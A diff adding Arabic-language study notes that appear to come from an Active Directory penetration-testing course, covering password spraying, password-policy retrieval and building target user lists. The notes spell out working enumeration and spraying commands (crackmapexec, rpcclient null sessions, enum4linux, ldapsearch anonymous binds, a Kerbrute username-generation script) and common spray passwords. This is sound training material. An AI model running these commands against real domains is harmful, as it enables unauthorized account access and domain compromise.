@@ -6555,7 +6555,7 @@ Klmcargo2
 
 في الجزء اللي فات استخدمنا أداة **Responder** على Linux علشان نعمل LLMNR و NBT-NS Poisoning ونلتقط الـ Hashes.
 
-لكن لو جهاز الـ Attacker كان Windows، أو العميل مدينا Windows Machine نشتغل منها، أو قدرنا نوصل لجهاز Windows داخل الشبكة كـ Local Administrator، هنستخدم أداة اسمها **Inveigh** لأنها بتؤدي نفس وظيفة Responder تقريبًا. :contentReference[oaicite:0]{index=0}
+لكن لو جهاز الـ Attacker كان Windows، أو العميل مدينا Windows Machine نشتغل منها، أو قدرنا نوصل لجهاز Windows داخل الشبكة كـ Local Administrator، هنستخدم أداة اسمها **Inveigh** لأنها بتؤدي نفس وظيفة Responder تقريبًا. 
 
 ---
 
@@ -7191,3 +7191,3847 @@ EnableMulticast = 0
 ولو مقدرناش نكسر أي Hash، يبقى ننتقل للمرحلة اللي بعدها وهي:
 
 **Password Spraying**.
+
+
+# Layer 8
+## Password Spraying Overview
+
+بعد ما خلصنا مرحلة الـ Enumeration وجمعنا أكبر قدر ممكن من المعلومات عن الشبكة، ممكن نبدأ نجرب طريقة اسمها **Password Spraying** علشان نحاول ناخد أول Access داخل الدومين.
+
+الهدف من Password Spraying هو إننا نحصل على Username و Password صحيحين ونستخدمهم كـ Foothold داخل الشبكة.
+
+---
+
+## يعني إيه Password Spraying؟
+
+Password Spraying هو هجوم بنجرب فيه:
+
+**Password واحدة شائعة**
+
+على
+
+**عدد كبير من المستخدمين.**
+
+يعني مثلًا بدل ما نجرب 100 Password على User واحد، نجرب Password واحدة على 100 User.
+
+وده بيقلل احتمالية قفل الحسابات (Account Lockout).
+
+---
+
+## منين بنجيب أسماء المستخدمين؟
+
+الكتاب بيقول إن أسماء المستخدمين ممكن تيجي من أكتر من مصدر، زي:
+
+- مرحلة OSINT.
+- مرحلة Enumeration.
+- LinkedIn.
+- Email Addresses.
+- Usernames اللي جمعناها أثناء الاختبار.
+
+كل معلومة بنجمعها أثناء الـ Pentest ممكن نستخدمها بعد كده في Password Spraying.
+
+---
+
+## الـ Penetration Test عملية مستمرة
+
+الكاتب بيأكد إن اختبار الاختراق مش عبارة عن خطوات ثابتة.
+
+إنت طول الوقت:
+
+- بتجمع معلومات.
+- بتجرب Techniques جديدة.
+- بترجع تعيد Enumeration.
+- تستخدم المعلومات الجديدة في هجمات مختلفة.
+
+يعني كل ما تكتشف معلومة، ممكن تفتحلك باب لهجوم جديد.
+
+---
+
+## استغلال الوقت
+
+الكاتب بيقول إن أغلب العمليات بتاخد وقت طويل، زي:
+
+- Scanning.
+- Cracking Hashes.
+- Enumeration.
+
+علشان كده لازم تستغل الوقت.
+
+مثال:
+
+لو Responder شغال ومستني حد يبعت Authentication، متقعدش مستنيه.
+
+ابدأ في نفس الوقت تعمل Password Spraying.
+
+وده بيخليك تخلص الـ Assessment أسرع.
+
+---
+
+## Story Time
+
+الكاتب بدأ يحكي تجربتين حصلوا معاه أثناء اختبارات اختراق حقيقية.
+
+كل الأمثلة كانت:
+
+- Grey Box Assessment.
+- عنده Internal Access.
+- معاه Linux VM.
+- وعارف فقط الـ IP Ranges.
+
+مفيش Credentials ولا معلومات إضافية.
+
+---
+
+## Scenario 1
+
+في أول اختبار، الكاتب عمل كل الـ Enumeration المعتادة.
+
+ودور على حاجات زي:
+
+- SMB NULL Session.
+- LDAP Anonymous Bind.
+
+لكن ملقاش أي حاجة تساعده يجيب قائمة بالمستخدمين.
+
+---
+
+## يعني إيه SMB NULL Session؟
+
+دي Session بتسمح لأي شخص يدخل على SMB بدون Username أو Password.
+
+ولو موجودة، ممكن نطلع منها Users أو Shares.
+
+لكن هنا كانت مقفولة.
+
+---
+
+## يعني إيه LDAP Anonymous Bind؟
+
+يعني نقدر نسأل Active Directory عن المستخدمين بدون Authentication.
+
+وده برضه كان مقفول.
+
+---
+
+## استخدم Kerbrute
+
+بما إنه معرفش يجيب Users بالطريقتين دول، استخدم:
+
+**Kerbrute**
+
+علشان يعمل Username Enumeration.
+
+---
+
+## جاب الـ Usernames منين؟
+
+الكاتب جمع أسماء المستخدمين من مصدرين.
+
+### أول مصدر
+
+Repository على GitHub اسمه:
+
+```text
+statistically-likely-usernames
+```
+
+وده فيه أسماء مستخدمين شائعة.
+
+زي:
+
+- jsmith
+- mjohnson
+- ajones
+
+---
+
+### ثاني مصدر
+
+LinkedIn.
+
+دخل على صفحة الشركة وشاف أسماء الموظفين.
+
+ومنها استنتج أسماء المستخدمين المحتملة.
+
+---
+
+## بعد كده
+
+دمج الليستتين مع بعض.
+
+وبعدين استخدم Kerbrute.
+
+علشان يعرف أي User فعلاً موجود داخل الدومين.
+
+---
+
+## بعد ما عرف الـ Users الصحيحة
+
+استخدم نفس الأداة في:
+
+Password Spraying.
+
+وجرب Password واحدة فقط.
+
+وهي:
+
+```text
+Welcome1
+```
+
+---
+
+## النتيجة
+
+قدر يلاقي:
+
+حسابين شغالين بنفس الباسورد.
+
+رغم إنهم كانوا Low Privileged Users.
+
+لكن ده كان كفاية.
+
+---
+
+## ليه كان كفاية؟
+
+لأنه استخدم الحسابات دي في تشغيل:
+
+BloodHound.
+
+ومن خلال BloodHound قدر يلاقي Attack Paths.
+
+وفي النهاية وصل لـ:
+
+Domain Compromise.
+
+يعني سيطر على الدومين بالكامل.
+
+---
+
+## Scenario 2
+
+في اختبار تاني.
+
+جرب نفس الطريقة.
+
+لكن Kerbrute مع LinkedIn.
+
+مجابوش أي نتيجة.
+
+---
+
+## بدأ يفكر بطريقة مختلفة
+
+دخل على Google.
+
+ودور على:
+
+PDFs
+
+خاصة بالشركة.
+
+---
+
+## ليه PDF؟
+
+لأن ملفات PDF غالبًا بيكون فيها Metadata.
+
+زي:
+
+- Author.
+- Creator.
+- Username.
+
+---
+
+## اكتشف حاجة مهمة
+
+فتح خصائص أربع ملفات PDF.
+
+ولقى إن:
+
+Author
+
+كان بالشكل:
+
+```text
+F9L8
+```
+
+يعني Username مكون من:
+
+- 4 خانات.
+- كل خانة حرف كبير أو رقم.
+
+مثال:
+
+```text
+AB12
+```
+
+أو
+
+```text
+X9T4
+```
+
+---
+
+## ليه دي معلومة خطيرة؟
+
+لأنه عرف شكل الـ Username.
+
+وبالتالي يقدر يولد كل الاحتمالات.
+
+---
+
+## Bash Script
+
+استخدم Script بسيط:
+
+```bash
+#!/bin/bash
+
+for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
+do
+    echo $x
+done
+```
+
+---
+
+## السكريبت بيعمل إيه؟
+
+بينشئ كل الاحتمالات الممكنة المكونة من:
+
+- A-Z
+- 0-9
+
+بطول أربع خانات.
+
+---
+
+## الناتج
+
+طلع:
+
+```text
+1,679,616
+```
+
+Username مختلف.
+
+---
+
+## بعد كده
+
+استخدم Kerbrute.
+
+وجرب كل الأسماء.
+
+---
+
+## النتيجة
+
+قدر يعرف:
+
+كل المستخدمين الموجودين داخل الدومين تقريبًا.
+
+---
+
+## ليه؟
+
+لأن الشركة كانت بتستخدم Pattern ثابت للـ Usernames.
+
+وده خلى Enumeration أسهل جدًا.
+
+---
+
+## بعد كده
+
+عمل Password Spraying.
+
+وقدر يجيب Passwords صحيحة لبعض الحسابات.
+
+---
+
+## النهاية
+
+استخدم Attack Chain معقدة.
+
+اشتملت على:
+
+- Resource-Based Constrained Delegation (RBCD).
+- Shadow Credentials Attack.
+
+وفي النهاية سيطر بالكامل على الـ Domain.
+
+---
+
+## Password Spraying Considerations
+
+رغم إن Password Spraying مفيد جدًا.
+
+لكن استخدامه بشكل خاطئ ممكن يسبب مشاكل كبيرة.
+
+أهمها:
+
+قفل عدد ضخم من الحسابات.
+
+وده ممكن يوقف شغل الشركة.
+
+---
+
+## الفرق بين Brute Force و Password Spraying
+
+### Brute Force
+
+بيجرب:
+
+Passwords كتير
+
+على
+
+User واحد.
+
+وده غالبًا يؤدي بسرعة إلى Account Lockout.
+
+---
+
+### Password Spraying
+
+بيجرب:
+
+Password واحدة
+
+على
+
+Users كتير.
+
+وده أقل خطورة.
+
+---
+
+## مثال
+
+بدل:
+
+```text
+Ahmed
+
+123456
+Welcome1
+Password1
+Passw0rd
+Winter2022
+```
+
+وده Brute Force.
+
+نعمل:
+
+```text
+Ahmed     Welcome1
+Mohamed   Welcome1
+Sara      Welcome1
+Ali       Welcome1
+```
+
+وبعدين نستنى.
+
+بعد فترة نجرب:
+
+```text
+Ahmed     Passw0rd
+Mohamed   Passw0rd
+Sara      Passw0rd
+Ali       Passw0rd
+```
+
+وهكذا.
+
+---
+
+## ليه بنستنى؟
+
+علشان منوصلش لعدد المحاولات اللي يقفل الحساب.
+
+الكتاب عامل Delay بين كل Password.
+
+وده أهم جزء في Password Spraying.
+
+---
+
+## Password Policy
+
+كل Domain بيكون ليه سياسة خاصة بالباسورد.
+
+مثلاً:
+
+بعد:
+
+5
+
+محاولات غلط.
+
+الحساب يتقفل.
+
+---
+
+## مثال مشهور
+
+الكتاب ذكر Policy شائعة جدًا.
+
+- 5 محاولات خاطئة.
+- الحساب يتقفل.
+- بعد 30 دقيقة يفتح تلقائيًا.
+
+---
+
+## في شركات تانية
+
+الحساب ممكن يفضل مقفول.
+
+لحد ما:
+
+Administrator
+
+يفتحه بنفسه.
+
+وده أخطر.
+
+---
+
+## لو مش عارف الـ Password Policy
+
+الأفضل تستنى:
+
+عدة ساعات
+
+بين كل Password.
+
+علشان تتأكد إن عداد المحاولات رجع للصفر.
+
+---
+
+## الأفضل
+
+لو قدرت تجيب Password Policy قبل الهجوم.
+
+يبقى أحسن.
+
+لأنك هتعرف:
+
+- كام محاولة مسموحة.
+- مدة الـ Lockout.
+- إمتى تكرر المحاولة.
+
+وده يقلل جدًا احتمال قفل الحسابات.
+
+---
+
+## لو مقدرتش تجيبها
+
+الكاتب بيقول:
+
+ممكن تعمل محاولة واحدة فقط.
+
+بـ Password ضعيفة ومشهورة.
+
+كآخر محاولة لو كل الطرق التانية فشلت.
+
+---
+
+## لو معاك User بالفعل
+
+لو عندك:
+
+- Foothold.
+- أو العميل مديلك User.
+
+يبقى تقدر تجمع Password Policy من داخل الدومين بطرق مختلفة.
+
+وده هيتشرح في الجزء اللي بعده.
+
+
+# Layer 9
+## Enumerating & Retrieving Password Policies
+
+الجزء ده بيتكلم عن إزاي كـ Pentester أو Red Teamer تعرف **Password Policy** الخاصة بالدومين (Active Directory Domain).
+
+يعني تعرف:
+- أقل عدد حروف للباسورد.
+- هل لازم الباسورد يكون Complex ولا لأ.
+- بعد كام محاولة غلط الأكونت يتقفل.
+- الأكونت بيفضل مقفول قد إيه.
+- الباسورد بيتغير كل كام يوم.
+
+كل المعلومات دي مهمة جدًا قبل أي Password Spraying Attack لأنك متقفلش حسابات المستخدمين.
+
+---
+
+## ليه Password Policy مهمة؟
+
+تخيل إن الشركة عاملة:
+
+- Lockout Threshold = 3
+
+وأنت جربت 5 Passwords.
+
+كل اليوزرز هيتقفلوا.
+
+وده يعتبر كارثة أثناء الـ Pentest.
+
+لكن لو عرفت الـ Policy الأول هتعرف:
+
+- أجرب كام Password.
+- أستنى قد إيه بين كل محاولة.
+- إيه الباسوردات المنطقية اللي أجربها.
+
+---
+
+## أول طريقة: عندك Credentials
+
+يعني معاك Username و Password صالحين.
+
+مثلاً:
+
+```bash
+crackmapexec smb 172.16.5.5 \
+-u avazquez \
+-p Password123 \
+--pass-pol
+```
+
+---
+
+## نشرح الأمر
+
+### crackmapexec
+
+أداة Enumeration ضخمة.
+
+بتستخدمها مع:
+
+- SMB
+- LDAP
+- WinRM
+- MSSQL
+- وغيرها.
+
+---
+
+### smb
+
+يعني هنستخدم بروتوكول SMB.
+
+---
+
+### 172.16.5.5
+
+IP بتاع الـ Domain Controller.
+
+---
+
+### -u
+
+اليوزر.
+
+```bash
+-u avazquez
+```
+
+---
+
+### -p
+
+الباسورد.
+
+```bash
+-p Password123
+```
+
+---
+
+### --pass-pol
+
+يعني:
+
+هاتلي Password Policy.
+
+---
+
+## الناتج
+
+```text
+Minimum password length: 8
+```
+
+يعني أقل باسورد لازم يكون 8 حروف.
+
+---
+
+```text
+Password history length: 24
+```
+
+يعني آخر 24 باسورد المستخدم استخدمهم.
+
+مينفعش يرجع يستخدم واحد منهم.
+
+---
+
+```text
+Maximum password age: Not Set
+```
+
+يعني الباسورد ملوش Expiration.
+
+مش لازم يتغير.
+
+---
+
+## Password Complexity Flags
+
+```text
+Password Complex: 1
+```
+
+يعني Complexity Enabled.
+
+يعني الباسورد لازم يحتوي على 3 من 4:
+
+- Uppercase
+- Lowercase
+- Number
+- Symbol
+
+مثال:
+
+```
+Password1
+```
+
+فيه:
+
+- Uppercase
+- Lowercase
+- Number
+
+يبقى Complex.
+
+---
+
+## Minimum password age
+
+```text
+1 day
+```
+
+يعني مينفعش تغير الباسورد مرتين في نفس اليوم.
+
+---
+
+## Reset Account Lockout Counter
+
+```text
+30 minutes
+```
+
+لو المستخدم غلط في الباسورد مرتين.
+
+واستنى 30 دقيقة.
+
+العداد يرجع صفر.
+
+---
+
+## Locked Account Duration
+
+```text
+30 minutes
+```
+
+لو الحساب اتقفل.
+
+هيفضل مقفول 30 دقيقة.
+
+---
+
+## Account Lockout Threshold
+
+```text
+5
+```
+
+بعد خمس Passwords غلط.
+
+الأكونت يتقفل.
+
+---
+
+## SMB NULL Session
+
+دلوقتي مفيش Credentials.
+
+ولا Username.
+
+ولا Password.
+
+هل نقدر نعرف Password Policy؟
+
+أحيانًا...
+
+أيوه.
+
+---
+
+## يعني إيه NULL Session؟
+
+يعني تعمل اتصال بـ SMB بدون Authentication.
+
+يعني:
+
+Username = ""
+
+Password = ""
+
+---
+
+زمان في Windows Server القديمة.
+
+Microsoft كانت سامحة بالحركة دي.
+
+عشان الـ Compatibility.
+
+لكن دلوقتي المفروض تكون مقفولة.
+
+---
+
+## ليه خطيرة؟
+
+لأنك ممكن تعرف:
+
+- Users
+- Groups
+- Computers
+- Password Policy
+- Domain Info
+
+بدون Login.
+
+---
+
+## أدوات تستخدمها
+
+- rpcclient
+- enum4linux
+- enum4linux-ng
+- CrackMapExec
+
+---
+
+## rpcclient
+
+الاتصال:
+
+```bash
+rpcclient -U "" -N 172.16.5.5
+```
+
+---
+
+### نشرح
+
+### -U ""
+
+Username فاضي.
+
+---
+
+### -N
+
+No Password.
+
+---
+
+## بعد الدخول
+
+```bash
+querydominfo
+```
+
+---
+
+## بيجيب
+
+```text
+Domain
+```
+
+اسم الدومين.
+
+---
+
+```text
+Total Users
+```
+
+عدد المستخدمين.
+
+---
+
+```text
+Server Role
+```
+
+هل الجهاز:
+
+- Domain Controller
+- Member Server
+- Workstation
+
+---
+
+## بعد كده
+
+```bash
+getdompwinfo
+```
+
+---
+
+هيطلع
+
+```text
+min_password_length:8
+```
+
+---
+
+```text
+password_properties
+```
+
+وهتعرف هل Complexity شغالة.
+
+---
+
+## enum4linux
+
+الأداة دي عبارة عن Wrapper.
+
+يعني بتستخدم جواها:
+
+- rpcclient
+- smbclient
+- net
+- nmblookup
+
+كلهم مرة واحدة.
+
+---
+
+تشغيلها:
+
+```bash
+enum4linux -P 172.16.5.5
+```
+
+---
+
+### -P
+
+هات Password Policy فقط.
+
+---
+
+## هتلاقي
+
+```text
+Minimum password length
+```
+
+---
+
+```text
+History
+```
+
+---
+
+```text
+Lockout Threshold
+```
+
+---
+
+```text
+Password Complexity
+```
+
+كلها في Output مرتب.
+
+---
+
+## enum4linux-ng
+
+دي نسخة أحدث.
+
+مكتوبة بـ Python.
+
+---
+
+مميزاتها:
+
+- أسرع.
+- Output أوضح.
+- JSON Export.
+- YAML Export.
+
+---
+
+تشغيلها
+
+```bash
+enum4linux-ng -P 172.16.5.5 -oA ilfreight
+```
+
+---
+
+## -oA
+
+يعني Export.
+
+هيعمل:
+
+```
+ilfreight.json
+
+ilfreight.yaml
+```
+
+---
+
+## ليه مفيد؟
+
+بعد كده تقدر تستخدم الملفات دي في Scripts.
+
+أو أدوات تانية.
+
+---
+
+## JSON
+
+هنلاقي مثلاً
+
+```json
+"null_session_possible":true
+```
+
+يعني:
+
+السيرفر بيسمح بـ NULL Session.
+
+وده Misconfiguration.
+
+---
+
+## Windows NULL Session
+
+من Windows.
+
+```cmd
+net use \\DC01\ipc$ "" /u:""
+```
+
+---
+
+## نشرح
+
+### net use
+
+بيعمل Mapping أو Connection.
+
+---
+
+### \\DC01\ipc$
+
+IPC Share.
+
+دي Share خاصة بالـ RPC Communication.
+
+---
+
+### ""
+
+Password فاضي.
+
+---
+
+### /u:""
+
+Username فاضي.
+
+---
+
+لو نجحت.
+
+يبقى فيه NULL Session.
+
+---
+
+## Error 1331
+
+```text
+Account Disabled
+```
+
+يعني الحساب Disabled.
+
+---
+
+## Error 1326
+
+```text
+Username or Password incorrect
+```
+
+يعني Login Failed.
+
+---
+
+## Error 1909
+
+```text
+Account Locked
+```
+
+يعني الحساب متقفل بسبب Password Policy.
+
+---
+
+## LDAP Anonymous Bind
+
+طريقة تانية.
+
+بدل SMB.
+
+نستخدم LDAP.
+
+---
+
+## LDAP
+
+البروتوكول الأساسي اللي Active Directory بيستخدمه.
+
+للبحث عن:
+
+- Users
+- Groups
+- Computers
+- Policies
+
+---
+
+## Anonymous Bind
+
+يعني تعمل LDAP Search بدون Login.
+
+---
+
+في Windows الحديثة.
+
+المفروض مقفولة.
+
+لكن ساعات Admin يفتحها بالغلط.
+
+---
+
+## ldapsearch
+
+```bash
+ldapsearch \
+-h 172.16.5.5 \
+-x \
+-b "DC=INLANEFREIGHT,DC=LOCAL"
+```
+
+---
+
+### -h
+
+Hostname.
+
+---
+
+### -x
+
+Simple Authentication.
+
+---
+
+### -b
+
+Base DN.
+
+يعني:
+
+ابدأ البحث من هنا.
+
+---
+
+## الناتج
+
+```text
+minPwdLength:8
+```
+
+أقل باسورد.
+
+---
+
+```text
+lockoutThreshold:5
+```
+
+عدد المحاولات.
+
+---
+
+```text
+pwdHistoryLength:24
+```
+
+عدد Password History.
+
+---
+
+## من Windows
+
+لو أنت Logged In.
+
+تقدر تستخدم:
+
+```cmd
+net accounts
+```
+
+---
+
+هيطلع
+
+```text
+Minimum password length
+```
+
+---
+
+```text
+Maximum password age
+```
+
+---
+
+```text
+Lockout threshold
+```
+
+---
+
+```text
+Lockout duration
+```
+
+كل المعلومات المهمة.
+
+---
+
+## PowerView
+
+أداة PowerShell شهيرة.
+
+```powershell
+Import-Module .\PowerView.ps1
+
+Get-DomainPolicy
+```
+
+---
+
+هترجع
+
+```text
+MinimumPasswordLength
+```
+
+---
+
+```text
+PasswordComplexity
+```
+
+---
+
+```text
+PasswordHistorySize
+```
+
+---
+
+```text
+LockoutBadCount
+```
+
+---
+
+```text
+LockoutDuration
+```
+
+---
+
+```text
+ResetLockoutCount
+```
+
+كلها في Object منظم.
+
+---
+
+## تحليل الـ Password Policy
+
+نفترض:
+
+```
+Minimum Length = 8
+
+Complexity = Enabled
+
+Threshold = 5
+
+Duration = 30 Minutes
+```
+
+---
+
+## معنى Minimum Length
+
+أي Password أقل من 8.
+
+مرفوض.
+
+---
+
+## معنى Complexity
+
+لازم يحتوي على 3 أنواع من:
+
+- Uppercase
+- Lowercase
+- Number
+- Symbol
+
+---
+
+## معنى Threshold
+
+بعد 5 Passwords غلط.
+
+الحساب يتقفل.
+
+---
+
+## معنى Duration
+
+الحساب يفضل مقفول 30 دقيقة.
+
+---
+
+## ليه الكلام ده مهم؟
+
+في Password Spraying.
+
+بدل ما تجرب 100 Password.
+
+هتجرب مثلاً:
+
+```
+Welcome1
+
+Summer2025
+
+Winter2025
+```
+
+بس.
+
+وبعدين تستنى.
+
+---
+
+## ليه Welcome1 مثال مشهور؟
+
+لأنه:
+
+- 8 Characters أو أكثر.
+- Uppercase.
+- Lowercase.
+- Number.
+
+وبيحقق الـ Complexity.
+
+وفي شركات كتير المستخدمين بيختاروه.
+
+---
+
+## Default Password Policy
+
+لما تنشئ Domain جديد.
+
+Windows بيحط افتراضيًا:
+
+| Policy                | Default  |
+| --------------------- | -------- |
+| Password History      | 24       |
+| Maximum Age           | 42 Days  |
+| Minimum Age           | 1 Day    |
+| Minimum Length        | 7        |
+| Complexity            | Enabled  |
+| Reversible Encryption | Disabled |
+| Lockout Threshold     | 0        |
+| Lockout Duration      | Not Set  |
+
+---
+
+## يعني إيه Lockout Threshold = 0 ؟
+
+يعني مفيش Lockout خالص.
+
+مهما تغلط.
+
+الحساب مش هيتقفل.
+
+وده يعتبر إعداد ضعيف جدًا لأنه بيسهل هجمات الـ Password Guessing والـ Password Spraying.
+
+---
+
+## Next Step
+
+بعد ما تعرف الـ Password Policy.
+
+الخطوة اللي بعدها هي:
+
+1. تجمع Usernames.
+2. تختار Password أو اتنين فقط.
+3. تعمل Password Spraying.
+4. تلتزم بالـ Lockout Policy ومتقفلش أي حساب.
+
+وده السبب إن معرفة الـ Password Policy تعتبر من أول وأهم خطوات أي هجوم Password Spraying ناجح.
+
+
+# Layer 10
+## Password Spraying - Making a Target User List
+
+بعد ما عرفنا في الجزء اللي فات إزاي نجيب الـ **Password Policy**، دلوقتي جه وقت أهم خطوة قبل تنفيذ Password Spraying Attack.
+
+وهي:
+
+**نعمل قائمة باليوزرز (Target User List).**
+
+لأن الـ Password Spraying بيعتمد على إنك:
+
+- تجرب Password واحد.
+- على عدد كبير من اليوزرز.
+
+فلازم الأول يكون عندك Usernames صحيحة.
+
+---
+
+## يعني إيه Target User List؟
+
+هي عبارة عن ملف فيه أسماء المستخدمين الموجودة داخل الـ Active Directory.
+
+مثلاً:
+
+```text
+administrator
+john
+ahmed
+mohamed
+itadmin
+```
+
+بعد كده هتستخدم الملف ده مع أدوات الـ Password Spraying.
+
+---
+
+## ليه لازم تكون القائمة صحيحة؟
+
+لو القائمة كلها Users مش موجودين أصلاً.
+
+يبقى:
+
+- الهجوم هيفشل.
+- هتضيع وقت.
+- ممكن تعمل Noise في الـ Logs.
+
+عشان كده بنحاول نجيب Users الحقيقيين.
+
+---
+
+## إزاي نجيب قائمة المستخدمين؟
+
+الدرس ذكر أكتر من طريقة.
+
+---
+
+### الطريقة الأولى
+
+SMB NULL Session
+
+لو السيرفر بيسمح بيها.
+
+---
+
+### الطريقة الثانية
+
+LDAP Anonymous Bind
+
+---
+
+### الطريقة الثالثة
+
+Kerbrute
+
+عن طريق Kerberos.
+
+---
+
+### الطريقة الرابعة
+
+لو معاك Credentials
+
+سواء:
+
+- Username / Password
+- أو حصلت عليهم بأي طريقة.
+
+---
+
+### الطريقة الخامسة
+
+OSINT
+
+زي:
+
+- LinkedIn
+- Emails
+- أسماء الموظفين
+
+لو مفيش أي Access.
+
+---
+
+## ليه Password Policy مهمة قبل الـ Spray؟
+
+افترض إنك عرفت:
+
+```
+Minimum Length = 10
+```
+
+يبقى مينفعش تضيع وقت في Password:
+
+```
+Welcome1
+```
+
+لأنه 8 حروف.
+
+مستحيل ينجح.
+
+---
+
+ولو عرفت:
+
+```
+Complexity Enabled
+```
+
+يبقى متجربش
+
+```
+password
+```
+
+لأنه مش Complex.
+
+---
+
+ولو عرفت
+
+```
+Threshold = 5
+```
+
+يبقى متجربش أكتر من 2 أو 3 Passwords.
+
+---
+
+## لو معرفتش Password Policy؟
+
+الكاتب بيقول:
+
+اسأل العميل.
+
+وده طبيعي في Pentest.
+
+---
+
+لو رفض يقولك.
+
+اعمل محاولة واحدة فقط.
+
+أو
+
+استنى ساعات بين كل Password.
+
+علشان متقفلش الحسابات.
+
+---
+
+## لازم تسجل كل حاجة
+
+ودي نقطة مهمة جدًا.
+
+الكاتب بيقول:
+
+سجل كل حاجة بتعملها.
+
+---
+
+## إيه اللي يتسجل؟
+
+### الحسابات
+
+مين اليوزرز اللي استهدفتهم.
+
+---
+
+### الـ Domain Controller
+
+الهجوم كان على أنهي DC.
+
+---
+
+### الوقت
+
+الساعة.
+
+---
+
+### التاريخ
+
+اليوم.
+
+---
+
+### Passwords
+
+إيه Password جربتها.
+
+---
+
+## ليه؟
+
+علشان:
+
+- متكررش نفس المحاولة.
+- تعرف عملت إيه.
+- لو العميل لقى Login Attempts.
+- تقدر تقوله دي كانت بتاعتي.
+
+وده Professional جدًا.
+
+---
+
+## SMB NULL Session to Pull User List
+
+دلوقتي هنستخدم NULL Session.
+
+مش علشان Password Policy.
+
+لكن علشان نجيب Users.
+
+---
+
+## الفكرة
+
+لو السيرفر بيسمح بـ NULL Session.
+
+يبقى نقدر نسحب كل Users.
+
+بدون Login.
+
+---
+
+## لو عندك Credentials
+
+يبقى أسهل بكتير.
+
+تقدر تعمل Query لـ Active Directory مباشرة.
+
+---
+
+## لو معندكش Credentials
+
+قدامك 3 احتمالات.
+
+---
+
+### الأول
+
+NULL Session
+
+---
+
+### الثاني
+
+LDAP Anonymous Bind
+
+---
+
+### الثالث
+
+OSINT.
+
+---
+
+## الكاتب قال نقطة مهمة
+
+لو أنت واخد SYSTEM Access.
+
+على جهاز داخل الدومين.
+
+تقدر تعمل Enumeration.
+
+---
+
+## ليه؟
+
+لأن الكمبيوتر نفسه ليه Account.
+
+اسمه
+
+```
+COMPUTER$
+```
+
+وده بيتعامل كأنه User.
+
+ويقدر يستعلم من Active Directory.
+
+---
+
+## لو مفيش أي Access
+
+يبقى تبدأ تجمع معلومات من الإنترنت.
+
+مثلاً:
+
+LinkedIn.
+
+Emails.
+
+أسماء الموظفين.
+
+---
+
+## أدوات تقدر تستخدمها
+
+- enum4linux
+- rpcclient
+- CrackMapExec
+
+---
+
+## enum4linux
+
+الأمر:
+
+```bash
+enum4linux -U 172.16.5.5
+```
+
+---
+
+## نشرح
+
+### enum4linux
+
+أداة Enumeration.
+
+---
+
+### -U
+
+يعني:
+
+هات Users فقط.
+
+---
+
+### 172.16.5.5
+
+IP بتاع الـ DC.
+
+---
+
+## الناتج
+
+```text
+administrator
+
+guest
+
+krbtgt
+
+lab_adm
+
+htb-student
+
+avazquez
+```
+
+كل User في سطر.
+
+---
+
+لكن الحقيقة.
+
+الأداة بتطلع Output كبير.
+
+---
+
+عشان كده استخدموا
+
+```bash
+grep
+```
+
+---
+
+## grep
+
+```bash
+grep "user:"
+```
+
+يعني:
+
+طلع السطور اللي فيها
+
+```
+user:
+```
+
+بس.
+
+---
+
+بعدها
+
+```bash
+cut
+```
+
+---
+
+## cut
+
+دي أداة بتقص جزء من النص.
+
+---
+
+```bash
+cut -f2 -d"["
+```
+
+يعني:
+
+اقسم السطر عند
+
+```
+[
+```
+
+وهات الجزء التاني.
+
+---
+
+بعدها
+
+```bash
+cut -f1 -d"]"
+```
+
+يعني:
+
+قص عند
+
+```
+]
+```
+
+وهات الجزء الأول.
+
+---
+
+مثلاً
+
+لو السطر
+
+```text
+user:[administrator]
+```
+
+يبقى الناتج
+
+```text
+administrator
+```
+
+---
+
+وده يخليك تطلع List نظيفة.
+
+---
+
+## rpcclient
+
+الاتصال
+
+```bash
+rpcclient -U "" -N 172.16.5.5
+```
+
+---
+
+بعد الدخول
+
+```bash
+enumdomusers
+```
+
+---
+
+## معنى enumdomusers
+
+اختصار
+
+Enumerate Domain Users.
+
+يعني:
+
+اعرض كل Users.
+
+---
+
+## الناتج
+
+```text
+user:[administrator]
+```
+
+---
+
+```text
+rid:[0x1f4]
+```
+
+---
+
+## يعني إيه RID؟
+
+RID
+
+Relative Identifier.
+
+---
+
+كل User في Active Directory.
+
+له SID.
+
+آخر جزء في الـ SID.
+
+اسمه RID.
+
+---
+
+مثلاً
+
+```
+S-1-5-21-XXX-XXX-500
+```
+
+الـ
+
+```
+500
+```
+
+هو RID.
+
+---
+
+Administrator.
+
+RID بتاعه دائمًا 500.
+
+---
+
+Guest.
+
+RID = 501.
+
+---
+
+KRBTGT.
+
+RID = 502.
+
+---
+
+وده بيساعد أحيانًا في التعرف على الحسابات المهمة.
+
+---
+
+## CrackMapExec --users
+
+الأمر
+
+```bash
+crackmapexec smb 172.16.5.5 --users
+```
+
+---
+
+## --users
+
+يعني:
+
+اعرض Users.
+
+---
+
+## الجميل في CrackMapExec
+
+مش بيطلع Users بس.
+
+---
+
+بيطلع كمان
+
+```text
+badpwdcount
+```
+
+---
+
+## يعني إيه badpwdcount؟
+
+عدد مرات إدخال Password غلط.
+
+---
+
+مثلاً
+
+```text
+badpwdcount : 3
+```
+
+يعني المستخدم غلط 3 مرات.
+
+---
+
+ولو الـ Lockout
+
+5
+
+يبقى لو جربت عليه مرتين.
+
+هيتقفل.
+
+---
+
+عشان كده ممكن تشيله من الـ Target List.
+
+---
+
+## baddpwdtime
+
+آخر مرة Password غلط.
+
+---
+
+مثلاً
+
+```text
+2022-02-17
+```
+
+يبقى آخر محاولة كانت في التاريخ ده.
+
+---
+
+## ليه المعلومة دي مهمة؟
+
+لأن الـ Password Policy بتقول مثلاً:
+
+```
+Reset Counter After
+
+30 Minutes
+```
+
+يبقى تعرف العداد لسه موجود.
+
+ولا رجع صفر.
+
+---
+
+## نقطة مهمة جدًا
+
+لو فيه أكتر من Domain Controller.
+
+كل واحد بيحتفظ بـ
+
+```
+badpwdcount
+```
+
+بشكل منفصل.
+
+---
+
+وده معناه.
+
+إنك لو سألت DC واحد.
+
+مش شرط يكون عنده العدد الحقيقي.
+
+---
+
+## الحل
+
+إما:
+
+تسأل كل Domain Controller.
+
+---
+
+أو
+
+تسأل الـ
+
+```
+PDC Emulator
+```
+
+لأنه المرجع الأساسي للحسابات داخل الدومين.
+
+---
+
+## ملخص الجزء
+
+بعد الجزء ده بقينا نعرف:
+
+- إزاي نبني Target User List.
+- ليه Password Policy لازم تتعرف الأول.
+- ليه لازم نوثق كل محاولة.
+- إزاي نجيب Users باستخدام enum4linux.
+- إزاي نجيب Users باستخدام rpcclient.
